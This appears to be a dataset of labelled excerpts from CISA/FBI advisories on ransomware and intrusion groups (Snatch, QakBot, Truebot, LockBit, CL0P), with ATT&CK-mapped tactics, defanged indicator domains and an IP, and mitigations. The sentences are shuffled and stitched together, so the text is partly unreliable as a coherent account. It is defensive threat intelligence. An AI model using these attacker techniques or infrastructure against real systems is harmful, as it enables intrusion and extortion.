Improving Security of Open Source Software in Operational Technology and Industrial Control Systems,2023-10-11,4,"{'phishing': 1, 'threats_of_violence': 7, 'malware': 4}","As identified in the 2015  Ukrainian power grid compromise[4], threat actors sent phishing emails targeting IT networks before pivoting to the ICS  environment and deploying BlackEnergy malware. This highlights the need for securing systems at the IT level to  reduce the likelihood of a threat actor pivoting to OT systems connected to IT infrastructure. Supply Chain Risks  As a result of the connections between OT and IT networks, OT systems are too often exposed to cyber threat actors  targeting control systems and the critical infrastructure they operate. To counter these threats, the cybersecurity  community recommends that defenders and operators keep all OT and IT systems up to date with patches and security  updates to address known exploited vulnerabilities. However, patching and security updates create opportunities for  threat actors to affect the OT supply chain—malicious threat actors can compromise the supply chain by embedding  malware in a patch or by compromising the website that hosts the patch, such as replacing the patch itself with malware  (known as a ‘watering hole’). Risk Exposure Reduction  CISA offers a range of services at no cost, including scanning and testing to help organizations reduce exposure to threats  via mitigating attack vectors. However, these controls can be difficult to correctly implement and are especially important in OT environments, which  are less likely to maintain defense-in-depth security controls once a threat actor breaches the network boundary and  obtains initial access to the environment. For example, Havex malware used legitimate system update installers to deploy and execute the malware  along with the normal software update process.

Threat  As of July 2023, the FBI noted two trends emerging across the ransomware environment and is  releasing this notification for industry awareness. These new trends included multiple  ransomware attacks on the same victim in close date proximity and new data destruction  tactics in ransomware attacks. TLP:CLEAR        TLP:CLEAR   The FBI noted a trend of dual ransomware attacks conducted in close proximity to one  another.1 During these attacks, cyber threat actors deployed two different ransomware variants  against victim companies from the following variants: AvosLocker, Diamond, Hive, Karakurt,  LockBit, Quantum, and Royal. This use of dual  ransomware variants resulted in a combination of data encryption, exfiltration, and financial  losses from ransom payments. Second ransomware attacks against an already compromised  system could significantly harm victim entities.  In early 2022, multiple ransomware groups increased use of custom data theft, wiper tools, and  malware to pressure victims to negotiate. The FBI and recommends network defenders apply the following mitigations to limit potential  adversarial use of common system and network discovery techniques and to reduce the risk of  compromise by ransomware:    Preparing for Cyber Incidents -   Maintain offline backups of data, and regularly maintain backup and restoration. 1 Ransomware attacks against the same victim occurring within 10 days, or less, of each other were considered dual ransomware  attacks. The majority of dual ransomware attacks occurred within 48 hours of each other. Protective Controls and Architecture -   Segment networks to prevent the spread of ransomware. Network segmentation can help prevent  the spread of ransomware by controlling traffic flows between—and access to—various  subnetworks and by restricting adversary lateral movement. TLP:CLEAR        TLP:CLEAR   Identify, detect, and investigate abnormal activity and potential traversal of the indicated  ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a  tool that logs and reports all network traffic, including lateral movement activity on a network. Joint Ransomware Task Force (JRTF)  The JRTF, co-chaired by CISA and FBI, is an interagency, collaborative effort to combat the  growing threat of ransomware attacks. The JRTF was launched in response to a series of high- profile ransomware attacks on U.S. The JRTF:    Coordinates and streamlines the US Government's response to ransomware attacks and  facilitates information sharing and collaboration between government agencies and private sector  partners.  Ensures operational coordination for activities such as developing and sharing best practices for  preventing and responding to ransomware attacks, conducting joint investigations and operations  against ransomware threat actors, and providing guidance and resources to organizations that have  been victimized by ransomware.  Represents a significant step forward in enabling unity of effort across the US Government's  efforts to address the growing threat of ransomware attacks. For more info on JRTF, see www.cisa.gov/joint-ransomware-task-force. PIN Number  The following information is being provided by the FBI, with no guarantees or warranties, for potential  use at the sole discretion of recipients to protect against cyber threats. Through these  partnerships, the FBI can assist with identifying vulnerabilities and mitigating potential threat activity. Timely patching is one of the most  efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity  threats. If threat actors are  not able to run these tools, they will have difficulty escalating privileges and/or moving laterally. Threat actors  use SMB to propagate malware across organizations. In other cases in 2022, malware containing data wipers  remained dormant until a set time, then executed to corrupt data in alternating intervals."

After  data exfiltration often involving direct communications with victims demanding ransom, Snatch threat  actors may threaten victims with double extortion, where the victims’ data will be posted on Snatch’s  extortion blog if the ransom goes unpaid. Snatch threat actors have been observed purchasing previously stolen data from other ransomware  variants in an attempt to further exploit victims into paying a ransom to avoid having their data  released on Snatch’s extortion blog. Note: Since November 2021, an extortion site operating under  the name Snatch served as a clearinghouse for data exfiltrated or stolen from victim companies on  Clearnet and TOR hosted by a bulletproof hosting service. Snatch threat actors communicate with their victims  through email and the Tox communication platform based on identifiers left in ransom notes or  through their extortion blog. Since November 2021, some victims reported receiving a spoofed call  from an unknown female who claimed association with Snatch and directed them to the group’s  extortion site.

The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency  (CISA) are releasing this joint CSA to disseminate known ransomware IOCs and TTPs associated  with the Snatch ransomware variant identified through FBI investigations as recently as June 1, 2023. Since mid-2021, Snatch threat actors have consistently evolved their tactics to take advantage of  current trends in the cybercriminal space and leveraged successes of other ransomware variants’  operations. FBI and CISA encourage organizations to implement the recommendations in the Mitigations section  of this CSA to reduce the likelihood and impact of ransomware incidents. First appearing in 2018, Snatch operates a ransomware-as-a-service (RaaS) model and claimed their  first U.S.-based victim in 2019. Snatch  threat actors use a customized ransomware variant notable for rebooting devices into Safe Mode  [T1562.009], enabling the ransomware to circumvent detection by antivirus or endpoint protection,  and then encrypting files when few services are running. In August 2023, individuals claiming to be  associated with the blog gave a media interview claiming the blog was not associated with Snatch  ransomware and “none of our targets has been attacked by Ransomware Snatch…”, despite multiple  confirmed Snatch victims’ data appearing on the blog alongside victims associated with other  ransomware groups, notably Nokoyawa and Conti.[1]  Initial Access and Persistence  Snatch threat actors employ several different methods to gain access to and maintain persistence on  a victim’s network. Prior to deploying the ransomware, Snatch threat actors were observed spending up to three months  on a victim’s system. Within this timeframe, Snatch threat actors exploited the victim’s network         FBI | CISA TLP:CLEAR  Page 3 of 16  |  Product ID: AA23-263A  TLP:CLEAR [T1590], moving laterally across the victim’s network with RDP [T1021.001] for the largest possible  deployment of ransomware and searching for files and folders [T1005] for data exfiltration [TA0010]  followed by file encryption [T1486]. Defense Evasion and Execution  During the early stages of ransomware deployment, Snatch threat actors attempt to disable antivirus  software [T1562.001] and run an executable as a file named safe.exe or some variation thereof. In  recent victims, the ransomware executable’s name consisted of a string of hexadecimal characters  which match the SHA-256 hash of the file in an effort to defeat rule-based detection [T1036]. Upon  initiation, the Snatch ransomware payload queries and modifies registry keys [T1012][T1112], uses  various native Windows tools to enumerate the system [T1569.002], finds processes [T1057], and  creates benign processes to execute Windows batch (.bat) files [T1059.003]. The Snatch ransomware executable appends a series of hexadecimal characters to each file and  folder name it encrypts—unique to each infection—and leaves behind a text file titled HOW TO  RESTORE YOUR FILES.TXT in each folder. In some instances, Snatch victims had a different ransomware variant deployed on their  systems, but received a ransom note from Snatch threat actors. Table 7: Snatch Threat Actors ATT&CK Techniques for Enterprise – Execution  Technique Title  ID  Use  Command and Scripting  Interpreter: Windows Command  Shell  T1059.003  Snatch threat actors may use batch files (.bat)  during ransomware execution and data  discovery. Snatch ransomware used  sc.exe. Table 9: Snatch Threat Actors ATT&CK Techniques for Enterprise – Defense Evasion  Technique Title  ID  Use  Masquerading  T1036  Snatch threat actors have the ransomware  executable match the SHA-256 hash of a  legitimate file to avoid rule-based detection. Impair Defenses: Disable or  Modify Tools  T1562.001  Snatch threat actors have attempted to disable  a system’s antivirus program to enable  persistence and ransomware execution. The  authoring agencies recommend that software  manufactures incorporate secure-by-design and  -default principles and tactics into their software  development practices for hardening software  against ransomware attacks (e.g., to prevent  threat actors from using Safe Mode to evade  detection and file encryption), thus  strengthening the secure posture for their  customers. •  Segment networks to prevent the spread of ransomware. Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks and by restricting adversary lateral movement [CPG 2.F]. •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting the  ransomware, implement a tool that logs and reports all network traffic and activity, including  lateral movement, on a network. FBI | CISA TLP:CLEAR  Page 16 of 16  |  Product ID: AA23-263A  TLP:CLEAR RESOURCES  •  Stopransomware.gov is a whole-of-government approach that gives one central location for  ransomware resources and alerts. •  Resource to mitigate a ransomware attack: #StopRansomware Guide. •  No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness  Assessment. Furthermore, payment may also embolden adversaries to target additional organizations,  encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit  activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI  and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint  Center (IC3) at ic3.gov, a local FBI Field Office, or to CISA at report@cisa.gov or (888) 282-0870. Snatch threat actors have targeted a wide range of critical infrastructure sectors including  the Defense Industrial Base (DIB), Food and Agriculture, and Information Technology sectors. See the MITRE  ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE  ATT&CK® tactics and techniques. Snatch threat actors gain persistence on a victim’s network by compromising an administrator  account [T1078.002] and establishing connections over port 443 [T1071.001] to a command and  control (C2) server located on a Russian bulletproof hosting service [T1583.003]. Per IP traffic from  event logs provided by recent victims, Snatch threat actors initiated RDP connections from a Russian  bulletproof hosting service and through other virtual private network (VPN) services [T1133]. Data Discovery and Lateral Movement  Snatch threat actors were observed using different TTPs to discover data, move laterally, and search  for data to exfiltrate. Snatch threat actors use sc.exe to configure, query, stop, start, delete, and add  system services using the Windows Command line. In addition to sc.exe, Snatch threat actors also  use tools such as Metasploit and Cobalt Strike [S0154]. Email Domains and Addresses  Since 2019, Snatch threat actors have used numerous email addresses to email victims. Email  addresses used by Snatch threat actors are random but usually originate from one of the following  domains listed in Tables 1 and 2:  Table 1: Malicious Email Domains Observed in Use by Snatch Threat Actors  Email Domains  sezname[.]cz  cock[.]li  airmail[.]cc         FBI | CISA TLP:CLEAR  Page 4 of 16  |  Product ID: AA23-263A  TLP:CLEAR   Table 2 shows a list of legitimate email domains offering encrypted email services that have been  used by Snatch threat actors. The use of  these email domains by a threat actor should not be attributed to the email domains, absent specific  articulable facts tending to show they are used at the direction or under the control of a threat actor.

Analysts confirmed that nation-state advanced  persistent threat (APT) actors exploited CVE-2022- 47966 to gain unauthorized access to a public-facing  application (Zoho ManageEngine ServiceDesk Plus),  establish persistence, and move laterally through the  network. CISA and co-sealers identified an array of threat actor activity, to include overlapping TTPs across  multiple APT actors. CISA | FBI | CNMF TLP:CLEAR  Page 3 of 22  |  Product ID: AA23-250A  TLP:CLEAR Analysis identified that a common behavior for these threat actors was to use disabled administrative  account credentials and delete logs from several critical servers in the environment [T1070.001]. In recent years, Ngrok has been leveraged  maliciously by a variety of threat actors,  including use for persistence, lateral  movement, and data exfiltration.[4],[5],[6]  Using Ngrok as an external service, APT  actors were able to gain access to and utilize  the command line on victim systems. APT actors’ specific use of Meterpreter—an  attack payload of Metasploit—serves as an  interactive shell and allows threat actors to  control and execute code on a system. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to  protect against the most common and impactful threats, tactics, techniques, and procedures. CISA offers a  range of services at no cost, including scanning and testing to help organizations reduce  exposure to threats via mitigating attack vectors. Proper network segmentation significantly reduces the ability for threat actor  lateral movement by controlling traffic flows between—and access to—various subnetworks. •  Implement the principle of least privilege to decrease threat actors’ abilities to access key  network resources. Secure Remote Access Software  Remote access software provides a proactive and flexible approach for organizations to internally  oversee networks, computers, and other devices; however, cyber threat actors increasingly co-opt         CISA | FBI | CNMF TLP:CLEAR  Page 20 of 22  |  Product ID: AA23-250A  TLP:CLEAR these tools for access to victim systems.

CISA and FBI encourage organizations to implement the recommendations in the Mitigations section  to reduce the likelihood of QakBot-related activity and promote identification of QakBot-facilitated  ransomware and malware infections. Note: The disruption of QakBot infrastructure does not mitigate  other previously installed malware or ransomware on victim computers. QakBot has been the precursor to a significant amount of computer  intrusions, to include ransomware and the compromise of user accounts within the Financial Sector. Since its initial inception as a banking trojan, QakBot has evolved into a multi-purpose botnet and  malware variant that provides threat actors with a wide range of capabilities, to include performing  reconnaissance, engaging in lateral movement, gathering and exfiltrating data, and delivering other  malicious payloads, including ransomware, on affected devices. FBI and CISA encourage organizations to implement the  recommendations in the Mitigations section of this CSA to reduce the likelihood of QakBot-related  infections and promote identification of QakBot-induced ransomware and malware infections. Disruption of the QakBot botnet does not mitigate other previously installed malware or ransomware  on victim computers. QakBot infections are particularly known to precede  the deployment of human-operated ransomware, including Conti[2], ProLock[3], Egregor[4], REvil[5],  MegaCortex[6], Black Basta[7], Royal[8], and PwndLocker.

Disruption of the QakBot botnet does not mitigate other already-installed malware or  ransomware on victim computers. •  Segment networks to prevent the spread of ransomware. Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks to restrict adversary lateral movement [CPG 2.F]. Ransomware Guidance  •  CISA.gov/stopransomware is a whole-of-government resource that serves as one central  location for ransomware resources and alerts. CISA | FBI TLP:CLEAR Page 8 of 9  | Product ID: AA23-242A  TLP:CLEAR  •  CISA, FBI, the National Security Agency (NSA), and Multi-State Information Sharing and  Analysis Center (MS-ISAC) published an updated version of the #StopRansomware Guide, as  ransomware actors have accelerated their tactics and techniques since its initial release in  2020. •  CISA has released a new module in its Cyber Security Evaluation Tool (CSET), the  Ransomware Readiness Assessment (RRA). Furthermore, payment may also embolden adversaries to target additional organizations, encourage  other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge  you to promptly report ransomware incidents to a local FBI Field Office or CISA at cisa.gov/report. Access to QakBot-affected (victim) devices  via compromised credentials are often sold to further the goals of the threat actor who delivered  QakBot. These providers lease servers to malicious threat actors, ignore  abuse complaints, and do not cooperate with law enforcement. Indicators of Compromise  FBI has observed the following threat actor tactics, techniques, and procedures (TTPs) in association  with OakBot infections:  1. CISA and NIST based the CPGs on existing  cybersecurity frameworks and guidance to protect against the most common and impactful threats  and TTPs. Timely patching is one of  the most efficient and cost-effective steps an organization can take to minimize its exposure to  cybersecurity threats. CISA offers a range of services at no cost, including scanning and testing  to help organizations reduce exposure to threats via mitigating attack vectors. If threat  actors are not able to run these tools, they will have difficulty escalating privileges and/or  moving laterally. VALIDATE SECURITY CONTROLS  In addition to applying mitigations, CISA and FBI recommend exercising, testing, and validating your  organization's security program against the threat behaviors mapped to the MITRE ATT&CK for  Enterprise framework in this advisory. Disruption operations targeting QakBot infrastructure resulted in the botnet takeover,  which severed the connection between victim computers and QakBot command and control (C2)  servers. At any given time, thousands of victim  computers running Microsoft Windows were infected with QakBot—the botnet was controlled through  three tiers of C2 servers. The FBI is working closely with industry partners to share information about the malware to  maximize detection, remediation, and prevention measures for network defenders. TECHNICAL DETAILS  Overview  QakBot—also known as Qbot, Quackbot, Pinkslipbot, and TA570—is responsible for thousands of  malware infections globally. QakBot Infrastructure  QakBot’s modular structure allows for various malicious features, including process and web injection,  victim network enumeration and credential stealing, and the delivery of follow-on payloads such as  Cobalt Strike[1], Brute Ratel, and other malware. Organizations are encouraged to review any connections with these IP addresses, which could  potentially indicate a QakBot and/or follow-on malware infection.

Note: Truebot  malware can be hidden within various, legitimate file formats that are used for malicious  purposes [T1036.008].[3]  •  Exploitation of CVE-2022-31199:  o Though phishing remains a prominent delivery method, cyber threat actors have shifted  tactics, exploiting, in observable manner, a remote code execution vulnerability (CVE- 2022-31199) in Netwrix Auditor [T1190]—software used for on-premises and cloud-based  IT system auditing. CISA | FBI | MS-ISAC| CCCS Page 5 of 26  |  Product ID: AA23-187A    TLP:CLEAR TLP:CLEAR Associated Delivery Vectors and Tools  Truebot has been observed in association with the following delivery vectors and tools:  Raspberry Robin (Malware)  Raspberry Robin is a wormable malware with links to other malware families and various infection  methods, including installation via USB drive [T1091].[5] Raspberry Robin has evolved into one of the  largest malware distribution platforms and has been observed deploying Truebot, as well as other  post-compromise payloads such as IcedID and Bumblebee malware.[6] With the recent shift in  Truebot delivery methods from malicious emails to the exploitation of CVE-2022-31199, a large  number of Raspberry Robin infections have leveraged this exploitable CVE.[2]  Flawed Grace (Malware)  FlawedGrace is a remote access tool (RAT) that can receive incoming commands [T1059] from a C2  server sent over a custom binary protocol [T1095] using port 443 to deploy additional tools [T1105].[7]  Truebot malware has been observed leveraging (and dropping) FlawedGrace via phishing campaigns  as an additional payload [T1566.002].[8] Note: FlawedGrace is typically deployed minutes after  Truebot malware is executed. Information is derived from a trusted third party, they observed cyber threat actors from  193.3.19[.]173 (Russia) using a compromised local account to conduct phishing campaigns on  May 23, 2023 and spread malware through: https[:]//snowboardspecs[.]com/nae9v, which then  promptly redirects the user to: https://www.meditimespharma[.]com/gfghthq/, which a trusted  third party has linked to other trending Truebot activity. This malicious domain has been linked to UNC4509, a  threat cluster that has been known to use traffic distribution systems (TDS) to redirect users to either  a benign or malicious website to facilitate their malicious phishing campaigns in May 2023. Phishing  T1566.002  Truebot actors can send spear phishing links to  gain initial access. MITIGATIONS  CISA and the authoring organizations recommend organizations implement the below mitigations,  including mandating phishing-resistant multifactor authentication (MFA) for all staff and services. o  Apply phishing-resistant multifactor authentication (MFA). •  Require phishing-resistant multifactor authentication for all services to the extent  possible, particularly for webmail, virtual private networks, and accounts that access critical  systems [CPG 2.H]. ransomware resources and alerts.)  •  #StopRansomware Guide  •  CISA: Implement Phishing-Resistant MFA  •  CISA: Guide to Securing Remote Access Software  •  CISA and MS-ISAC: Joint Ransomware Guide  •  CISA: Cross-Sector Cybersecurity Performance Goals  •  CL0P Ransomware Uses Truebot Malware for Access to Networks   •  Field Offices – FBI  •  NSA – Zero Trust Security Model    REFERENCES  [1] Bishop Fox: Netwrix Auditor Advisory  [2] Talos Intelligence: Breaking the Silence - Recent Truebot Activity  [3] The DFIR Report: Truebot Deploys Cobalt Strike and FlawedGrace  [4] MAR-10445155-1.v1 .CLEAR Truebot Activity Infects U.S. In addition, CISA, FBI, MS-ISAC, and CCCS recommend network defenders apply the following  mitigations to limit potential adversarial use of common system and network discovery techniques and  to reduce the impact and risk of compromise by ransomware or data extortion actors:  •  Disable File and Printer sharing services. Truebot is a botnet that has been used by malicious cyber groups like CL0P  Ransomware Gang to collect and exfiltrate information from its target victims. •  Segment networks to prevent the spread of ransomware. Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to various  subnetworks, restricting further lateral movement [CPG 2.F]. •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting ransomware,  implement a tool that logs and reports all network traffic, including lateral movement activity on  a network.

As recently as May 31, 2023, the authoring organizations have observed an  increase in cyber threat actors using new malware variants of Truebot (also known as  Silence.Downloader). See the MITRE  ATT&CK Tactics and Techniques section below for cyber threat actors’ activity mapped to MITRE  ATT&CK tactics and techniques. Initial Access and Execution  In recent months, open source reporting has detailed an increase in Truebot malware infections,  particularly cyber threat actors using new tactics, techniques, and procedures (TTPs), and delivery  methods.[2] Based on the nature of observed Truebot operations, the primary objective of a Truebot  infection is to exfiltrate sensitive data from the compromised host(s) for financial gain [TA0010]. Cyber threat actors have further been observed concealing email  attachments (executables) as software update notifications [T1189] that appear to be  legitimate [T1204.002][T1566.002]. Through exploitation of this CVE, cyber threat actors gain initial  access, as well as the ability to move laterally within the compromised network [T1210]. In  this instance, cyber threat actors can redirect victims to malicious domains and further establish a C2  connection. Cobalt Strike (Tool)  Cobalt Strike is a popular remote access tool (RAT) that cyber threat actors have leveraged—in an  observable manner—for a variety of post-exploitation means. Typically a few hours after Truebot’s  execution phase, cyber threat actors have been observed deploying additional payloads containing  Cobalt Strike beacons for persistence and data exfiltration purposes [T1059].[2] Cyber threat actors  use Cobalt Strike to move laterally via remote service session hijacking [T1563.001][T1563.002],  collecting valid credentials through LSASS memory credential dumping, or creating local admin  accounts to achieve pass the hash alternate authentication [T1003.001][T1550.002]. Teleport (Tool)  Cyber threat actors have been observed using a custom data exfiltration tool, which Talos has named  “Teleport.”[2] Teleport is known to evade detection during data exfiltration by using an encryption key  hardcoded in the binary and a custom communication protocol [T1095] that encrypts data using  advanced encryption standard (AES) and a hardcoded key [T1048][T1573.002].

Reduce threat of malicious actors using remote access tools by:  •  Implementing application controls to manage and control execution of software,  including allowlisting remote access programs. o  PowerShell logs contain valuable data, including historical OS and registry interaction and  possible IOCs of a cyber threat actor’s PowerShell use. •  Reduce the threat of credential compromise via the following:  o  Place domain admin accounts in the protected users’ group to prevent caching of  password hashes locally. Timely patching is one of  the most efficient and cost-effective steps an organization can take to minimize its exposure to  cybersecurity threats. VALIDATE SECURITY CONTROLS  In addition to applying mitigations, CISA recommends exercising, testing, and validating your  organization's security program against the threat behaviors mapped to the MITRE ATT&CK for  Enterprise framework in this advisory.

Understanding Ransomware Threat Actors: LockBit,2023-06-14,2,"{'phishing': 5, 'extortion': 5, 'ransomware': 63, 'threats_of_violence': 19, 'malware': 5}","Phishing  T1566  LockBit affiliates use phishing and  spearphishing to gain access to victims'  networks. •  Require phishing-resistant multifactor authentication (MFA) for all services to the extent  possible, particularly for webmail, virtual private networks, and privileged accounts that access  critical systems [CPG 2.H]. •  Raise awareness for phishing threats in your organization. Phishing is one of the primary  infection vectors in ransomware campaigns, and all employees should receive practical  training on the risks associated with the regular use of  email. With the rise of sophisticated  phishing methods, such as using stolen email communication or artificial intelligence (AI)  systems such as ChatGPT, the distinction between legitimate and malicious emails becomes  more complex. The term 'victims' may include  those who have been attacked, or those who have been threatened or blackmailed (with the attack  having taken place). The leak sites only show the portion of LockBit affiliates’ victims subjected to secondary extortion. Since 2021, LockBit affiliates have employed double extortion by first encrypting victim data and then  exfiltrating that data while threatening to post that stolen data on leak sites. Post Detonation TTPs  When LockBit affiliates target an organization responsible for managing other organizations’  networks, CERT NZ has observed LockBit affiliates attempt secondary ransomware extortion after  detonation of the LockBit variant on the primary target. This extortion is in the  form of secondary ransomware that locks down services those customers consume. TLP:CLEAR  Product ID: AA23-165A June 14, 2023 Co-Authored by:  TLP:CLEAR         LockBit         Publication: June 14, 2023    Cybersecurity and Infrastructure Security Agency  FBI | MS-ISAC | ACSC | NCSC-UK | CCCS | ANSSI | BSI | CERT NZ | NCSC-NZ    UNDERSTANDING RANSOMWARE THREAT ACTORS:          International Partnership  TLP:CLEAR  Page 2 of 29  |  Product ID: AA23-165A  TLP:CLEAR  SUMMARY  In 2022, LockBit was the most deployed ransomware variant across the world and continues to be  prolific in 2023. LockBit ransomware operation functions as a Ransomware-as-a-Service (RaaS)  model where affiliates are recruited to conduct ransomware attacks using LockBit ransomware tools  and infrastructure. Due to the large number of unconnected affiliates in the operation, LockBit  ransomware attacks vary significantly in observed tactics, techniques, and procedures (TTPs). This  variance in observed ransomware TTPs presents a notable challenge for organizations working to  maintain network security and protect against a ransomware threat. The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI),  the Multi-State Information Sharing and Analysis Center (MS-ISAC), and the following international  partners, hereafter referred to as “authoring organizations,” are releasing this Cybersecurity Advisory  (CSA) detailing observed activity in LockBit ransomware incidents and providing recommended  mitigations to enable network defenders to proactively improve their organization’s defenses against  this ransomware operation. •  Australian Cyber Security Centre (ACSC)  •  Canadian Centre for Cyber Security (CCCS)  •  United Kingdom’s National Cyber Security Centre (NCSC-UK)  •  National Cybersecurity Agency of France (ANSSI)  •  Germany’s Federal Office for Information Security (BSI)  •  New Zealand’s Computer Emergency Response Team (CERT NZ) and National Cyber  Security Centre (NCSC NZ)   The authoring organizations encourage the implementation of the recommendations found in this  CSA to reduce the likelihood and impact of future ransomware incidents. In 2022, LockBit was the most active global ransomware group and RaaS provider  in terms of the number of victims claimed on their data leak site. [1] A RaaS cybercrime group  maintains the functionality of a particular ransomware variant, sells access to that ransomware variant  to individuals or groups of operators (often referred to as “affiliates”), and supports affiliates’  deployment of their ransomware in exchange for upfront payment, subscription fees, a cut of profits,  or a combination of upfront payment, subscription fees, and a cut of profits. •  Engaging in publicity-generating activities stunts, such as paying people to get LockBit tattoos  and putting a $1 million bounty on information related to the real-world identity of LockBit’s  lead who goes by the persona “LockBitSupp.”  •  Developing and maintaining a simplified, point-and-click interface for its ransomware, making  it accessible to those with a lower degree of technical skill. In parallel, affiliates that work with LockBit  and other notable variants are constantly revising the TTPs used for deploying and executing  ransomware. Table 1: Evolution of LockBit RaaS  Date  Event  September 2019  First observed activity of ABCD ransomware, the predecessor  to LockBit. [4]   January 2020  LockBit-named ransomware first seen on Russian-language  based cybercrime forums. [5]  March 2022  Emergence of LockBit 3.0, also known as LockBit Black, that  shares similarities with BlackMatter and Alphv (also known as  BlackCat) ransomware. [2, 6]  January 2023  Arrival of LockBit Green incorporating source code from Conti  ransomware. [7]  April 2023  LockBit ransomware encryptors targeting macOS seen on  VirusTotal [8, 9]    LockBit 2.0, LockBit 3.0, LockBit Green, and LockBit Linux-ESXi Locker are still available for affiliates’  use on LockBit’s panel. LockBit Statistics  Percentage of ransomware incidents attributed to LockBit:  •  Australia: From April 1, 2022, to March 31, 2023, LockBit made up 18% of total reported  Australian ransomware incidents. This figure includes all variants of LockBit ransomware, not  solely LockBit 3.0. •  Canada: In 2022, LockBit was responsible for 22% of attributed ransomware incidents in  Canada.[10]  •  New Zealand: In 2022, CERT NZ received 15 reports of LockBit ransomware, representing  23% of 2022 ransomware reports. •  United States: In 2022, 16% of the State, Local, Tribal, and Tribunal (SLTT) government  ransomware incidents reported to the MS-ISAC were identified as LockBit attacks. This  included ransomware incidents impacting municipal governments, county governments, public  higher education and K-12 schools, and emergency services (e.g., law enforcement). International Partnership  TLP:CLEAR  Page 6 of 29  |  Product ID: AA23-165A  TLP:CLEAR  Number of LockBit ransomware attacks in the U.S. ransoms paid to LockBit:  •  Approximately $91M since LockBit activity was first observed in the U.S. •  New Zealand: The first recorded incident involving LockBit ransomware was in March 2021. Operational activity related to LockBit in France  Since the first case in July 2020 to present, ANSSI has handled 80 alerts linked to the LockBit  ransomware, which accounts for 11% of all ransomware cases handled by ANSSI in that period. Table 2 shows the LockBit activity observed by ANSSI versus overall  ransomware activity tracked by the Computer Emergency Response Team-France (CERT-FR). Overall Ransomware Activity  Year  Number of Incidents  Percentage of CERT-FR’s  Ransomware-Related Activity  2020 (from July)  4  2%  2021  20  10%  2022  30  27%  2023  15  27%  Total (2020-2023)  69  11%           International Partnership  TLP:CLEAR  Page 7 of 29  |  Product ID: AA23-165A  TLP:CLEAR  Table 3 shows the number of instances different LockBit strains were observed by ANSSI from July  2020 to present. For these reasons, the leak  sites are not a reliable indicator of when LockBit ransomware attacks occurred. The date of data  publication on the leak sites may be months after LockBit affiliates actually executed ransomware  attacks. Table 4 shows a list of legitimate freeware and open-source tools LockBit affiliates have repurposed  for ransomware operations. •  Segment networks to prevent the spread of ransomware. Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks and by restricting adversary lateral movement. Isolate web-facing  applications to further minimize the spread of ransomware across a network [CPG 2.F]. •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting the  ransomware, implement a tool that logs and reports all network traffic, including lateral  movement activity on a network [CPG 1.E]. Implement Mitigations for Defense-in-Depth  Implementing multiple mitigations within a defense-in-depth approach can help protect against  ransomware, such as LockBit. CERT NZ explains How ransomware happens and how to stop it by  applying mitigations, or critical controls, to provide a stronger defense to detect, prevent, and respond  to ransomware before an organization’s data is encrypted. By understanding the most common attack  vectors, organizations can identify gaps in network defenses and implement the mitigations noted in  this advisory to harden organizations against ransomware attacks. In Figure 3, a ransomware attack  is broken into three phases:   •  Initial Access where the cyber actor is looking for a way into a network. Figure 3 shows the mitigations/critical controls, as various colored hexagons, working together to stop  a ransomware attacker from accessing a network to steal and encrypt data.

#StopRansomware: CL0P Ransomware Gang Exploits CVE-2023-34362 MOVEit Vulnerability,2023-06-07,2,"{'phishing': 6, 'extortion': 2, 'non_payment_non_delivery': 1, 'ransomware': 26, 'threats_of_violence': 11, 'botnet': 1, 'malware': 9}","Appearing in February 2019, and evolving from the CryptoMix ransomware variant, CL0P was  leveraged as a Ransomware as a Service (RaaS) in large-scale spear-phishing campaigns that used  a verified and digitally signed binary to bypass system defenses. In 2019, TA505 actors  leveraged CL0P ransomware as the final payload of a phishing campaign involving a macro-enabled  document that used a Get2 malware dropper for downloading SDBot and FlawedGrace. Considered to be one of the largest phishing and malspam distributors  worldwide, TA505 is estimated to have compromised more than 3,000 U.S.-based organizations and  8,000 global organizations. TA505 has operated:   •  A RaaS and has acted as an affiliate of other RaaS operations,  •  As an initial access broker (IAB), selling access to compromised corporate networks,   •  As a customer of other IABs,   •  And as a large botnet operator specializing in financial fraud and phishing attacks. Phishing  T1566  CL0P actors send a large volume of spear-phishing  emails to employees of an organization to gain initial  access. o Apply phishing-resistant multifactor authentication (MFA). CL0P was previously known for its  use of the ‘double extortion’ tactic of stealing and encrypting victim data, refusing to restore victim  access and publishing exfiltrated data on Tor via the CL0P^_-LEAKS website. In addition, the authoring authorities of this CSA recommend network defenders apply the  following mitigations to limit potential adversarial use of common system and network  discovery techniques and to reduce the impact and risk of compromise by ransomware or  data extortion actors:   • Implement a recovery plan to maintain and retain multiple copies of sensitive or  proprietary data and servers in a physically separate, segmented, and secure location  (i.e., hard drive, storage device, the cloud). The ransom notes  threatened to publish the stolen files on the CL0P data leak site if victims did not pay the ransom  amount.

